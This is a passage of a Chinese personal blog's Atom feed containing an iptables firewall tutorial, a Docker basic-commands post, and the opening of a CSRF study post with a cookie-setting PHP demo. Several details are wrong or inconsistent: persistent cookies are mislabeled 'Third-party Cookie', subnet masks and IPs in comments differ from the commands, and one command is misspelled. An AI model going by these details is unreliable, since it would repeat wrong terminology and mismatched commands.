      <category term="注入" scheme="http://Err0rzz.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
    
      <category term="mysql提权" scheme="http://Err0rzz.github.io/tags/mysql%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>iptables的简单使用</title>
    <link href="http://Err0rzz.github.io/2017/12/21/iptables%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
    <id>http://Err0rzz.github.io/2017/12/21/iptables的简单使用/</id>
    <published>2017-12-21T02:06:31.000Z</published>
    <updated>2017-12-21T05:54:15.728Z</updated>
    
    <content type="html"><![CDATA[<p>作为出题人，考虑到学弟们不会肝通宵猝死，就需要关闭web题目。当时百度说用<code>iptables</code>结果华丽的失败了，最后还是潇洒的断网来拒绝服务。后来还是重新看了一下这个命令，发现还真是好用啊…</p><a id="more"></a><p>原理来自老师ppt，命令详解转自<a href="http://blog.chinaunix.net/uid-26495963-id-3279216.html" target="_blank" rel="external">http://blog.chinaunix.net/uid-26495963-id-3279216.html</a><br><br></p><h1 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h1><p>先回顾一下防火墙的原理吧</p><ul><li>防火墙通过<strong>审查</strong>经过的每一个数据包，判断它是否有相<strong>匹配</strong>的<strong>过滤规则</strong>，根据规则的先后顺序进行<strong>一一比较</strong>，直到满足其中的一条规则为止，然后依据控制机制做出相应的动作。如果都不满足，则将数据包丢弃，从而保护网络的安全。</li><li>包过滤分为：静态包过滤、状态包过滤.</li><li>静态包过滤：在<strong>IP</strong>层只根据IP包的<code>源及目的地址，协议类型，端口号</code>进行过滤，安全性较差，不能应对现在复杂的网络应用</li></ul><p><br><br><code>iptables</code>相关概念：</p><ul><li>netfilter/iptabels是与Linux内核集成的包过滤防火墙系统，简称iptables。</li><li>几乎所有的linux发行版本都会包含iptables的功能，它可以代替昂贵的商业防火墙解决方案，<strong>完成封包过滤、封包重定向和网络地址转换NAT等</strong>功能。</li><li>在linux 内核中的模块被称为 netfilter。</li></ul><p><br><br><code>tables</code>相关概念：<br>iptables内置了filter，nat和mangle三张表,分别用于实现包过滤，网络地址转换和包重构的功能。</p><ul><li>filter负责过滤数据包，包括的规则链有input，output和forward。</li><li>nat则涉及到网络地址转换，包括的规则链有prerouting，postrouting和output；</li><li>mangle表则主要应用在修改数据包内容上，用来做流量整形的，默认的规则链有：INPUT，OUTPUT，NAT，POSTROUTING，PREROUTING</li><li>input匹配目的IP是本机的数据包。</li><li>output匹配源IP是本机的数据包。</li><li>forward匹配流经本机的数据包。</li><li>prerouting用来修改目的地址用来做DNAT。</li><li>postrouting用来修改源地址用来做SNAT。</li></ul><p><br><br><code>chains</code>相关概念：</p><ul><li>链（chains）是数据包<strong>传播的路径</strong>，每一条链其实就是众多规则中的一个<strong>检查清单</strong>，每一条链中可以有<strong>一条或数条</strong>规则。当一个数据包到达一个链时，iptables就会从链中<strong>第一条规则开始</strong>检查，看该数据包是否满足规则所定义的条件。</li><li>如果满足，系统就会根据该条规则所定义的方法处理该数据包；否则iptables将<strong>继续检查下一条</strong>规则，如果该数据包不符合链中任一条规则，iptables就会根据该链<strong>预先定义的默认策略</strong>来处理数据包。</li></ul><p><br><br><code>rules</code>相关概念：</p><ul><li>规则（rules）其实就是网络管理员预定义的<strong>条件</strong>，规则一般的定义为“<strong>如果数据包头符合这样的条件，就这样处理这个数据包</strong>”。规则存储在内核空间的信息包<strong>过滤表</strong>中，这些规则分别指定了<strong>源地址、目的地址、传输协议（如TCP、UDP、ICMP）和服务类型（如HTTP、FTP和SMTP）</strong>等。当数据包与规则匹配时，iptables就根据规则所定义的方法来处理这些数据包，如<code>放行（accept）</code>、<code>拒绝（reject）</code>和<code>丢弃（drop）</code>等。</li><li>配置防火墙的主要工作就是<strong>添加、修改和删除</strong>这些规则。</li><li><strong>注意：规则的次序非常关键，谁的规则越严格，应该放的越靠前，而检查规则的时候，是按照从上往下的方式进行检查的。</strong><br><br></li></ul><p>iptables传输数据包的过程：<br><img src="https://i.imgur.com/waGZsEP.jpg" alt=""></p><ol><li>当一个数据包进入网卡时，它首先进入<strong>PREROUTING</strong>链，内核根据路由表和数据包目的IP判断是否需要<strong>转送</strong>出去。</li><li>如果数据包就是<strong>进入本机</strong>的，它就会沿着图向下移动，到达<strong>INPUT</strong>链。数据包到了INPUT链后，任何进程都会收到它。本机上运行的程序可以发送数据包，这些数据包会经过<strong>OUTPUT</strong>链，然后到达POSTROUTING链输出。</li><li>如果数据包是要<strong>转发</strong>出去的，且内核允许转发，数据包就会如图所示向右移动，经过<strong>FORWARD</strong>链，然后到达<strong>POSTROUTING</strong>链输出。<br><br></li></ol><h1 id="iptables操作"><a href="#iptables操作" class="headerlink" title="iptables操作"></a>iptables操作</h1><h2 id="规则写法："><a href="#规则写法：" class="headerlink" title="规则写法："></a>规则写法：</h2><p>格式：iptables [-t table] COMMAND chain CRETIRIA -j ACTION</p><ul><li>-t table ：3个filter nat mangle，默认是filter</li><li>COMMAND：定义如何对规则进行管理</li><li>chain：指定你接下来的规则到底是在哪个链上操作的，当定义策略的时候，是可以省略的</li><li>CRETIRIA:指定匹配标准</li><li>-j ACTION :指定如何进行处理</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">比如：不允许172.16.0.0/24的进行访问。</div><div class="line">iptables -t filter -A INPUT -s 172.16.0.0/16 -p udp --dport 53 -j DROP</div><div class="line">当然你如果想拒绝的更彻底：</div><div class="line">iptables -t filter -R INPUT 1 -s 172.16.0.0/16 -p udp --dport 53 -j REJECT</div><div class="line">查看定义规则的详细信息:</div><div class="line">iptables -L -n -v</div></pre></td></tr></table></figure><p><br></p><h2 id="COMMAND详解："><a href="#COMMAND详解：" class="headerlink" title="COMMAND详解："></a>COMMAND详解：</h2><h3 id="chains管理："><a href="#chains管理：" class="headerlink" title="chains管理："></a>chains管理：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">-P :设置默认策略的，默认策略一般只有两种</div><div class="line">iptables -P INPUT (DROP|ACCEPT)  默认是关的/默认是开的</div><div class="line">比如：</div><div class="line">iptables -P INPUT DROP 这就把默认规则给拒绝了。并且没有定义哪个动作，所以关于外界连接的所有规则包括Xshell连接之类的，远程连接都被拒绝了。</div><div class="line"></div><div class="line">-F: FLASH，</div><div class="line">清空规则链的(注意每个链的管理权限)</div><div class="line">iptables -t nat -F PREROUTING</div><div class="line">iptables -t nat -F 清空nat表的所有链</div><div class="line">        </div><div class="line">-N:NEW 支持用户新建一个链</div><div class="line">iptables -N inbound_tcp_web 表示附在tcp表上用于检查web的。</div><div class="line">   </div><div class="line">-X: 用于删除用户自定义的空链</div><div class="line">使用方法跟-N相同，但是在删除之前必须要将里面的链给清空昂了</div><div class="line">     </div><div class="line">-E：用来Rename chain主要是用来给用户自定义的链重命名</div><div class="line">       </div><div class="line">-Z：清空链，及链中默认规则的计数器的（有两个计数器，被匹配到多少个数据包，多少个字节）</div></pre></td></tr></table></figure><p><br></p><h3 id="rules管理："><a href="#rules管理：" class="headerlink" title="rules管理："></a>rules管理：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-A：追加规则</div><div class="line">         </div><div class="line">-I num : 插入规则。比如说：-I 3 表示插入为第三条</div><div class="line">         </div><div class="line">-R num：替换/修改第几条规则</div><div class="line">         </div><div class="line">-D num：删除第几条规则</div></pre></td></tr></table></figure><p><br></p><h3 id="查看管理："><a href="#查看管理：" class="headerlink" title="查看管理："></a>查看管理：</h3><p>参数是<code>-L</code>，子命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">-n：</div><div class="line">以数字的方式显示ip，它会将ip直接显示出来，如果不加-n，则会将ip反向解析成主机名。</div><div class="line"> </div><div class="line">-v：显示详细信息</div><div class="line"> </div><div class="line">-vv</div><div class="line"> </div><div class="line">-vvv :越多越详细</div><div class="line"> </div><div class="line">-x：在计数器上显示精确值</div><div class="line"> </div><div class="line">--line-numbers : 显示规则的行号</div><div class="line"> </div><div class="line">-t nat：显示所有的关卡的信息</div></pre></td></tr></table></figure></p><p><br></p><h2 id="CRETIRIA详解："><a href="#CRETIRIA详解：" class="headerlink" title="CRETIRIA详解："></a>CRETIRIA详解：</h2><h3 id="地址匹配："><a href="#地址匹配：" class="headerlink" title="地址匹配："></a>地址匹配：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">-s：指定作为源地址匹配，这里不能指定主机名称，必须是IP</div><div class="line">IP | IP/MASK | 0.0.0.0/0.0.0.0</div><div class="line">而且地址可以取反，加一个“!”表示除了哪个IP之外</div><div class="line"> </div><div class="line">-d：表示匹配目标地址，使用同-s</div><div class="line"></div><div class="line">-p：用于匹配协议的（这里的协议通常有3种，TCP/UDP/ICMP）</div><div class="line"> </div><div class="line">-i eth0：从这块网卡流入的数据，流入一般用在INPUT和PREROUTING上</div><div class="line"></div><div class="line">-o eth0：从这块网卡流出的数据，流出一般在OUTPUT和POSTROUTING上</div></pre></td></tr></table></figure><p><br></p><h3 id="协议扩展："><a href="#协议扩展：" class="headerlink" title="协议扩展："></a>协议扩展：</h3><ul><li>-p tcp :TCP协议的扩展。一般有三种扩展<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">--dport XX-XX：指定目标端口,不能指定多个非连续端口,只能指定单个端口，比如:--dport 21  或者 --dport 21-23 (此时表示21,22,23)</div><div class="line">--sport：指定源端口</div><div class="line">--tcp-fiags：TCP的标志位（SYN,ACK，FIN,PSH，RST,URG）</div><div class="line">    对于它，一般要跟两个参数：</div><div class="line">1.检查的标志位</div><div class="line">2.必须为1的标志位</div><div class="line">--tcp-flags syn,ack,fin,rst syn   =    --syn</div><div class="line">表示检查这4个位，这4个位中syn必须为1，其他的必须为0。所以这个意思就是用于检测三次握手的第一次包的。对于这种专门匹配第一包的SYN为1的包，还有一种简写方式，叫做--syn</div></pre></td></tr></table></figure></li></ul><ul><li>-p udp：UDP协议的扩展<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">--dport</div><div class="line">--sport</div></pre></td></tr></table></figure></li></ul><ul><li>-p icmp：icmp数据报文的扩展<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">--icmp-type：</div><div class="line">echo-request(请求回显)，一般用8 来表示</div><div class="line">所以 --icmp-type 8 匹配请求回显数据包</div><div class="line">echo-reply （响应的数据包）一般用0来表示</div></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="显式扩展-m"><a href="#显式扩展-m" class="headerlink" title="显式扩展(-m)"></a>显式扩展(-m)</h3><p>扩展各种模块</p><ul><li><p>-m multiport:表示启用多端口扩展</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">打开21，23,80这三个不连续端口</div><div class="line">-m multiport --dports 21,23,80</div></pre></td></tr></table></figure></li><li><p>-m mac –mac-source:表示mac源地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">源mac地址为00:0c:29:27:55:3F</div><div class="line">-m mac --mac-source 00:0c:29:27:55:3F</div></pre></td></tr></table></figure></li><li><p>-m –iprange –src-range:表示源IP范围</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">源IP地址为192.168.1.20-192.168.1.99</div><div class="line">-m iprange --src-range 192.168.1.20-192.168.1.99</div></pre></td></tr></table></figure></li><li><p>-m state –state：表示数据包连接状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">新的数据包</div><div class="line">-m state --state NEW</div></pre></td></tr></table></figure></li></ul><p><br></p><h2 id="ACTION详解："><a href="#ACTION详解：" class="headerlink" title="ACTION详解："></a>ACTION详解：</h2><p>常用的ACTION：</p><ul><li>DROP：悄悄丢弃，一般我们多用DROP来隐藏我们的身份，以及隐藏我们的链表</li><li>REJECT：明示拒绝</li><li>ACCEPT：接受</li><li>custom_chain：转向一个自定义的链</li><li>MASQUERADE：源地址伪装</li><li>REDIRECT：重定向：主要用于实现端口重定向</li><li>MARK：打防火墙标记的</li><li>RETURN：返回，在自定义链执行完毕后使用返回，来返回原规则链<br><br></li></ul><h1 id="记录一下常见的命令："><a href="#记录一下常见的命令：" class="headerlink" title="记录一下常见的命令："></a>记录一下常见的命令：</h1><ul><li><strong>只要是来自于172.16.0.0/16网段的都允许访问我本机的172.16.100.1的SSHD服务</strong><br>分析：首先肯定是在允许表中定义的。因为不需要做NAT地址转换之类的，然后查看我们SSHD服务，在22号端口上，处理机制是接受，对于这个表，需要有一来一回两个规则，如果我们允许也好，拒绝也好，对于访问本机服务，我们最好是定义在INPUT链上，而OUTPUT再予以定义就好。(会话的初始端先定义)，所以加规则就是：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">定义进来的： iptables -t filter -A INPUT -s 172.16.0.0/16 -d 172.16.100.1 -p tcp --dport 22 -j ACCEPT</div><div class="line">定义出去的： iptables -t filter -A OUTPUT -s 172.16.100.1 -d 172.16.0.0/16 -p tcp --dport 22 -j ACCEPT</div><div class="line">将默认策略改成DROP:</div><div class="line">iptables -P INPUT DROP</div><div class="line">iptables -P OUTPUT DROP</div><div class="line">iptables -P FORWARD DROP</div></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><strong>假如我们允许自己ping别人，但是别人ping自己ping不通如何实现呢？</strong><br>分析：对于ping这个协议，进来的为8（ping），出去的为0(响应).我们为了达到目的，需要8出去,允许0进来，也就相当于我们要求我们只发送请求包，接收响应包(符合ping别人的要求，不符合别人ping自己的要求)<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">在出去的端口上：iptables -A OUTPUT -p icmp --icmp-type 8 -j ACCEPT</div><div class="line">在进来的端口上：iptables -A INPUT -p icmp --icmp-type 0 -j ACCEPT</div></pre></td></tr></table></figure></li></ul><p>结果如下：<br>没设规则之前，双方都能ping通<br><img src="https://i.imgur.com/ala3qws.png" alt=""><br><img src="https://i.imgur.com/4s6hrIn.png" alt=""><br>设了规则<br><img src="https://i.imgur.com/qcS5mBH.png" alt=""><br>此时只能ping别人，别人ping不到了<br><img src="https://i.imgur.com/YQntQJ1.png" alt=""><br><img src="https://i.imgur.com/eDFSTfF.png" alt=""><br><br></p><ul><li><strong>拒绝进入防火墙的所有ICMP协议数据包</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -I INPUT -p icmp -j REJECT</div></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><strong>允许防火墙转发出ICMP协议外所有数据包</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -A FORWARD -p !icmp -j ACCEPT</div></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><strong>拒绝转发来自192.168.1.10主机的数据，允许转发来自192.168.0.0/24网段</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -A FORWARD -s 192.168.1.11 -j REJECT </div><div class="line">iptables -A FORWARD -s 192.168.0.0/24 -j ACCEPT</div></pre></td></tr></table></figure></li></ul><p>说明：注意要把拒绝的放在前面不然就不起作用了啊。<br><br></p><ul><li><strong>封堵网段(192.168.1.0/24)，两小时后解封</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># iptables -I INPUT -s 192.168.1.0/24 -j DROP </div><div class="line"># iptables -I FORWARD -s 192.168.1.0/24 -j DROP </div><div class="line"># at now 2 hours at&gt; iptables -D INPUT 1 at&gt; iptables -D FORWARD 1</div></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><strong>只允许管理员从202.13.0.0/16网段使用SSH远程登录防火墙主机。</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -A INPUT -p tcp --dport 22 -s 202.13.0.0/16 -j ACCEPT</div><div class="line">iptables -A INPUT -p tcp --dport 22 -j DROP</div></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><strong>允许本机开放从TCP端口20-1024提供的应用服务。</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -A INPUT -p tcp --dport 20:1024 -j ACCEPT</div><div class="line">iptables -A OUTPUT -p tcp --sport 20:1024 -j ACCEPT</div></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><strong>允许转发来自192.168.0.0/24局域网段的DNS解析请求数据包。</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -A FORWARD -s 192.168.0.0/24 -p udp --dport 53 -j ACCEPT </div><div class="line">iptables -A FORWARD -d 192.168.0.0/24 -p udp --sport 53 -j ACCEPT</div></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><strong>禁止转发来自MAC地址为00：0C：29：27：55：3F的和主机的数据包</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -A FORWARD -m mac --mac-source 00:0c:29:27:55:3F -j DROP</div></pre></td></tr></table></figure></li></ul><p>说明：iptables中使用“-m 模块关键字”的形式调用显示匹配。咱们这里用“-m mac –mac-source”来表示数据包的源MAC地址。<br><br></p><ul><li><strong>允许防火墙本机对外开放TCP端口20、21、25、110以及被动模式FTP端口1250-1280</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -A INPUT -p tcp -m multiport --dport 20,21,25,110,1250:1280 -j ACCEPT</div></pre></td></tr></table></figure></li></ul><p>说明：这里用“-m multiport –dport”来指定目的端口及范围<br><br></p><ul><li><strong>禁止转发源IP地址为192.168.1.20-192.168.1.99的TCP数据包。</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -A FORWARD -p tcp -m iprange --src-range 192.168.1.20-192.168.1.99 -j DROP</div></pre></td></tr></table></figure></li></ul><p>说明：此处用“-m –iprange –src-range”指定IP范围。<br><br></p><ul><li><strong>禁止转发与正常TCP连接无关的非—syn请求数据包。</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -A FORWARD -p tcp -m state --state NEW ! --syn -j DROP</div></pre></td></tr></table></figure></li></ul><p>说明：“-m state”表示数据包的连接状态，“NEW”表示与任何连接无关的，新的嘛！<br><br></p><ul><li><strong>拒绝访问防火墙的新数据包，但允许响应连接或与已有连接相关的数据包</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -A INPUT -p tcp -m state --state NEW -j DROP</div><div class="line">iptalbes -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT</div></pre></td></tr></table></figure></li></ul><p>说明：“ESTABLISHED”表示已经响应请求或者已经建立连接的数据包，“RELATED”表示与已建立的连接有相关性的，比如FTP数据连接等。<br><br></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作为出题人，考虑到学弟们不会肝通宵猝死，就需要关闭web题目。当时百度说用&lt;code&gt;iptables&lt;/code&gt;结果华丽的失败了，最后还是潇洒的断网来拒绝服务。后来还是重新看了一下这个命令，发现还真是好用啊…&lt;/p&gt;
    
    </summary>
    
    
      <category term="运维" scheme="http://Err0rzz.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
      <category term="防火墙" scheme="http://Err0rzz.github.io/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"/>
    
  </entry>
  
  <entry>
    <title>docker基本操作</title>
    <link href="http://Err0rzz.github.io/2017/12/20/docker%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
    <id>http://Err0rzz.github.io/2017/12/20/docker基本操作/</id>
    <published>2017-12-20T09:13:13.000Z</published>
    <updated>2018-03-08T07:23:01.781Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间一直在耍docker，为了防止遗忘还是记录一下这些基本命令吧。</p><a id="more"></a><p><strong>查找镜像：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker search web</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/RnTbdGU.png" alt=""><br><br><br><strong>下载镜像：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker pull php</div></pre></td></tr></table></figure></p><p><br><br><strong>上传镜像：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker push err0r/web</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/sEUoEYz.png" alt=""><br>上传镜像前需要先登录仓库，我这里用的是默认仓库–dockerhub，然后需要打个tag<br><br><br><strong>查看本地镜像：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker images</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/Yu9btFi.png" alt=""><br><br><br><strong>启动docker：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</div></pre></td></tr></table></figure></p><p>OPTIONS说明：</p><pre><code>-a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；-d: 后台运行容器，并返回容器ID；-i: 以交互模式运行容器，通常与 -t 同时使用；-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；--name=&quot;nginx-lb&quot;: 为容器指定一个名称；--dns 8.8.8.8: 指定容器使用的DNS服务器，默认和宿主一致；--dns-search example.com: 指定容器DNS搜索域名，默认和宿主一致；-h &quot;mars&quot;: 指定容器的hostname；-e username=&quot;ritchie&quot;: 设置环境变量；--env-file=[]: 从指定文件读入环境变量；--cpuset=&quot;0-2&quot; or --cpuset=&quot;0,1,2&quot;: 绑定容器到指定CPU运行；-m :设置容器使用内存最大值；--net=&quot;bridge&quot;: 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型；--link=[]: 添加链接到另一个容器；--expose=[]: 开放一个端口或一组端口； </code></pre><p>虽然这么多参数，但是我基本上只有<code>-it</code>来启动交互式<code>bash</code>，用<code>-p hostport:dockerport</code>来开启端口映射，<code>--name</code>来指定容器名称,<code>-v hostpath:dockerpath</code>来挂载目录<br><img src="https://i.imgur.com/mZJCJnn.png" alt=""><br>image的话，会先搜索本地的image有没有，如果没有的话，再去仓库找。<br><br><br><strong>查看正在运行的docker：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker ps</div></pre></td></tr></table></figure></p><p>后面的话暂时只用过<code>-a</code>来列出所有docker(包括停止了的docker)，<code>-l</code>来查看最新创建的docker，<code>-q</code>只列出docker的id<br><br><br><strong>退出docker：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ctrl+p+q || exit</div></pre></td></tr></table></figure></p><p>安全退出docker，docker仍然在后台运行而不是关闭<br><br><br><strong>重新进入docker：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker exec -it 9d /bin/bash</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/FOjuRQP.png" alt=""><br>值得一提的是，在docker命令中不一定要把id全部都打出来，只要打出能识别唯一的docker的部分就好了，比如9d，电脑就能找到这个docker就ok了。<br><br><br><strong>docker重新变成image：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker commit 9d test</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/5ubzbqQ.png" alt=""><br>先接docker，再接生成的image的名字<br><br><br><strong>docker停止：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker stop 9d</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/ekjYWjv.png" alt=""><br>值得一提的是，不管之后删image还是删docker，都需要先停止全部相关的docker才能删除成功。<br><br><br><strong>docker删除：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker rm 9d</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/UgMplxZ.png" alt=""><br>可以看到连ps -a都看不到这个9d的容器了。<br>这里有个骚操作，如果要想批量启动停止或者删除docker，可以用以下的命令,不过有一点，删除一定要记得先停止。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">docker start $(docker ps -a -q)</div><div class="line">docker stop $(docker ps -a -q)</div><div class="line">docker rm $(docker ps -a -q)</div></pre></td></tr></table></figure></p><p><br><br><strong>镜像删除</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker rmi test</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/8FGvOfl.png" alt=""><br><br></p><p>就先这些吧，以后碰到需要记得再记吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前段时间一直在耍docker，为了防止遗忘还是记录一下这些基本命令吧。&lt;/p&gt;
    
    </summary>
    
    
      <category term="docker" scheme="http://Err0rzz.github.io/tags/docker/"/>
    
      <category term="基础命令" scheme="http://Err0rzz.github.io/tags/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>CSRF学习</title>
    <link href="http://Err0rzz.github.io/2017/12/15/CSRF%E5%AD%A6%E4%B9%A0/"/>
    <id>http://Err0rzz.github.io/2017/12/15/CSRF学习/</id>
    <published>2017-12-15T06:05:12.000Z</published>
    <updated>2017-12-15T11:05:44.791Z</updated>
    
    <content type="html"><![CDATA[<p>最近在看道哥的《白帽子讲web安全》(大学买的第一本书)，觉得物超所值啊~把书上的一些简单的实验给复现一下，记录一下。</p><a id="more"></a><h2 id="浏览器的cookie策略"><a href="#浏览器的cookie策略" class="headerlink" title="浏览器的cookie策略"></a>浏览器的cookie策略</h2><p>浏览器的cookie分两种：一种是“<strong>Session Cookie</strong>”，又称“临时Cookie”；另一种是“<strong>Third-party Cookie</strong>”，也称为“本地Cookie”。</p><p>两者的区别在于，<strong>Third-party Cookie</strong>是服务器在<code>Set-Cookie</code>是指定了<code>Expire</code>时间，只有到了时间后Cookie才会失效，所以这种Cookie会保存在本地；而<strong>Session Cookie</strong>则没有指定<code>Expire</code>时间，所以浏览器关闭后，<strong>Session Cookie</strong>就失效了。</p><p>例如在<code>http://67.209.184.30/a.php</code>中，会给浏览器写入两个Cookie：一个是<strong>Session Cookie</strong>，另一个为<strong>Third-party Cookie</strong>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">header(&apos;set-cookie: cookie1=test1;&apos;);</div><div class="line">header(&apos;set-cookie: cookie2=test2;expires=Thu,01-jan-2030 00:00:01 GMT;&apos;,false);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p>访问该页面，发现浏览器接受了两个Cookie。<br><img src="https://i.imgur.com/KaIej1a.png" alt=""><br><img src="https://i.imgur.com/3nmFqTW.png" 